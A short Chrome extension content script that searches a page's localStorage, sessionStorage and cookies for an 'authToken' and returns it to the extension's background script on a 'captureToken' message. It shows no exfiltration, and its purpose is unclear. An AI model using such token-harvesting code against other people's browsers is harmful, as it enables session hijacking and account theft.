// Function to extract token from the page
function extractToken() {
  // Check localStorage
  let token = localStorage.getItem('authToken');
  if (token) return token;

  // Check sessionStorage
  token = sessionStorage.getItem('authToken');
  if (token) return token;

  // Check cookies
  const cookies = document.cookie.split(';');
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i].trim();
    if (cookie.startsWith('authToken=')) {
      return cookie.substring('authToken='.length, cookie.length);
    }
  }

  // If no token found, return null
  return null;
}

// Listen for messages from the background script
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.action === "captureToken") {
    const token = extractToken();
    sendResponse({token: token});
  }
});

console.log('Content script loaded');
